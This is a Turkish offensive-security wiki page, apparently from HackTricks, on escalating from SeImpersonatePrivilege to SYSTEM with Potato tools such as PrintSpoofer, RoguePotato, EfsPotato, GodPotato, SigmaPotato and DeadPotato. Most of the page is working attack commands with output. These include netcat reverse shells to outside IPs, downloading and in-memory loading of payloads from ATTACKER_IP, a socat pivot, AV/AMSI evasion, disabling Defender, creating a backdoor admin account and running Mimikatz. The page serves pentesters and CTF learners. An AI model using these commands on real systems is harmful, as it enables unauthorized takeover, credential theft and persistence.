# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato çalışmaz**: Windows Server 2019 ve Windows 10 build 1809 ve sonraki sürümlerde. Ancak [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** aynı ayrıcalıklardan yararlanmak ve `NT AUTHORITY\SYSTEM` seviyesinde erişim elde etmek için kullanılabilir. Bu [blog yazısı](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/), JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 host'larında impersonation ayrıcalıklarını kötüye kullanmak için kullanılabilen `PrintSpoofer` aracını ayrıntılı olarak ele alır.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024–2025'te sıkça sürdürülen modern bir alternatif, bellek içi/.NET reflection kullanımını ve genişletilmiş işletim sistemi desteğini ekleyen SigmaPotato'dur (GodPotato'nun bir fork'u). Aşağıdaki hızlı kullanıma ve References bölümündeki repo'ya bakın.

Arka plan ve manuel teknikler için ilgili sayfalar:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Gereksinimler ve yaygın sorunlar

Aşağıdaki tekniklerin tümü, bu ayrıcalıklardan birine sahip bir context'ten impersonation destekleyen ayrıcalıklı bir servisin kötüye kullanılmasına dayanır:

- SeImpersonatePrivilege (en yaygın) veya SeAssignPrimaryTokenPrivilege
- Token zaten SeImpersonatePrivilege içeriyorsa high integrity gerekli değildir (IIS AppPool, MSSQL vb. birçok service account için tipiktir)

Ayrıcalıkları hızlıca kontrol edin:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notlar:

- shell'iniz SeImpersonatePrivilege eksik kısıtlı bir token altında çalışıyorsa (bazı bağlamlarda Local Service/Network Service için yaygındır), FullPowers kullanarak hesabın varsayılan yetkilerini yeniden kazanın, ardından bir Potato çalıştırın. Örnek: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer, Print Spooler service'in çalışır durumda olmasını ve yerel RPC endpoint'i (spoolss) üzerinden erişilebilir olmasını gerektirir. Spooler'ın PrintNightmare sonrasında devre dışı bırakıldığı hardened ortamlarda RoguePotato/GodPotato/DCOMPotato/EfsPotato kullanmayı tercih edin.
- RoguePotato, TCP/135 üzerinden erişilebilir bir OXID resolver gerektirir. Egress engellenmişse bir redirector/port-forwarder kullanın (aşağıdaki örneğe bakın). Eski build'ler `-f` flag'ine ihtiyaç duyuyordu.
- EfsPotato/SharpEfsPotato, MS-EFSR'ı abuse eder; pipe'lardan biri engellenmişse alternatif pipe'ları deneyin (lsarpc, efsrpc, samr, lsass, netlogon).
- RpcBindingSetAuthInfo sırasında alınan 0x6d3 hatası genellikle bilinmeyen veya desteklenmeyen bir RPC authentication service olduğunu gösterir; farklı bir pipe/transport deneyin veya hedef service'in çalıştığından emin olun.
- DeadPotato gibi “Kitchen-sink” fork'ları, diske yazan ek payload modüllerini (Mimikatz/SharpHound/Defender off) bundle eder; slim orijinallere kıyasla daha yüksek EDR detection bekleyin.

## Hızlı Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notlar:
- Mevcut konsolda etkileşimli bir process başlatmak için `-i` veya tek satırlık bir komut çalıştırmak için `-c` kullanabilirsiniz.
- Spooler service gerektirir. Devre dışı bırakılmışsa bu işlem başarısız olur.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Eğer outbound 135 engellenmişse, redirector üzerinde socat kullanarak OXID resolver'ı pivot edin:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato, Spooler/BITS yerine **PrintNotify** service'i hedefleyen ve 2022'nin sonlarında yayımlanan daha yeni bir COM abuse primitive'idir. Binary, PrintNotify COM server'ını başlatır, sahte bir `IUnknown` yerleştirir ve ardından `CreatePointerMoniker` aracılığıyla privileged callback'i tetikler. **SYSTEM** olarak çalışan PrintNotify service'i geri bağlandığında process, döndürülen token'ı duplicate eder ve verilen payload'ı full privileges ile başlatır.<sup>[[13]](#references)</sup>

Temel operasyonel notlar:

* Print Workflow/PrintNotify service'i kurulu olduğu sürece Windows 10/11 ve Windows Server 2012–2022 üzerinde çalışır (PrintNightmare sonrasında legacy Spooler disabled olsa bile bulunur).
* Calling context'in **SeImpersonatePrivilege** yetkisine sahip olmasını gerektirir (IIS APPPOOL, MSSQL ve scheduled-task service account'ları için tipiktir).
* Doğrudan bir command veya original console içinde kalmanızı sağlayan interactive mode kabul eder. Örnek:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Tamamen COM-based olduğu için named-pipe listener'lar veya external redirector'lar gerekli değildir; bu da Defender'ın RoguePotato'nun RPC binding'ini engellediği host'larda onu drop-in replacement haline getirir.

Ink Dragon gibi operator'lar, SharePoint üzerinde ViewState RCE elde ettikten hemen sonra `w3wp.exe` worker'ından SYSTEM'e pivot yapmak ve ShadowPad kurmadan önce PrintNotifyPotato'yu çalıştırır.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
İpucu: Bir pipe başarısız olursa veya EDR bunu engellerse, desteklenen diğer pipe'ları deneyin:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notlar:
- SeImpersonatePrivilege mevcut olduğunda Windows 8/8.1–11 ve Server 2012–2022 genelinde çalışır.
- Kurulu runtime ile eşleşen binary'yi alın (ör. modern Server 2022'de `GodPotato-NET4.exe`).
- İlk execution primitive'iniz kısa timeout'lara sahip bir webshell/UI ise payload'ı script olarak stage edin ve uzun bir inline command yerine GodPotato'dan bunu çalıştırmasını isteyin.<sup>[[12]](#references)</sup>

Yazılabilir bir IIS webroot'undan hızlı staging kalıbı:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato, varsayılan olarak RPC_C_IMP_LEVEL_IMPERSONATE kullanan service DCOM objects'lerini hedefleyen iki varyant sunar. Sağlanan binaries'leri build edin veya kullanın ve command'inizi çalıştırın:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (güncellenmiş GodPotato fork'u)

SigmaPotato, .NET reflection aracılığıyla in-memory execution ve bir PowerShell reverse shell helper gibi modern özellikler ekler.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
2024–2025 derlemelerindeki ek avantajlar (v1.2.x):
- Yerleşik reverse shell flag'i `--revshell` ve 1024 karakterlik PowerShell limitinin kaldırılması sayesinde, uzun AMSI-bypassing payload'larını tek seferde çalıştırabilirsiniz.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), ayrıca basit heuristics'leri şaşırtmak için `VirtualAllocExNuma()` üzerinden temel bir AV evasion yöntemi.
- PowerShell Core ortamları için .NET 2.0'a karşı derlenmiş ayrı bir `SigmaPotatoCore.exe`.

### DeadPotato (modüllerle yeniden düzenlenmiş 2024 GodPotato)

DeadPotato, GodPotato OXID/DCOM impersonation zincirini korur; ancak operatörlerin ek tooling kullanmadan hemen SYSTEM yetkisi alabilmesi ve persistence/collection işlemlerini gerçekleştirebilmesi için post-exploitation yardımcılarını bünyesinde barındırır.<sup>[[15]](#references)</sup>

Yaygın modüller (tümü SeImpersonatePrivilege gerektirir):

- `-cmd "<cmd>"` — SYSTEM olarak arbitrary command çalıştırır.
- `-rev <ip:port>` — hızlı reverse shell.
- `-newadmin user:pass` — persistence için local admin oluşturur.
- `-mimi sam|lsa|all` — credentials dump etmek üzere Mimikatz'ı diske bırakır ve çalıştırır (diske dokunur, gürültülüdür).
- `-sharphound` — SharpHound collection'ı SYSTEM olarak çalıştırır.
- `-defender off` — Defender real-time protection'ı devre dışı bırakır (çok gürültülüdür).

Örnek one-liner'lar:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Ek binary'ler içerdiğinden daha yüksek AV/EDR uyarıları bekleyin; gizliliğin önemli olduğu durumlarda daha küçük GodPotato/SigmaPotato kullanın.

## Referanslar

- [1] [PrintSpoofer – Windows 10 ve Server 2019'da Impersonation Privileges'dan yararlanma](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [JuicyPotato'ya artık son mu? Eski hikaye, RoguePotato'ya hoş geldiniz](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Service account'lar için varsayılan token privileges'ı geri yükleme](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction ile webroot RCE → SYSTEM için FullPowers + GodPotato](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → SYSTEM için GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Ink Dragon'ın İçinde: Relay Network ve Stealthy Offensive Operation'ın İç İşleyişinin Ortaya Çıkarılması](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Dahili post-ex modules içeren GodPotato rework'ü](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
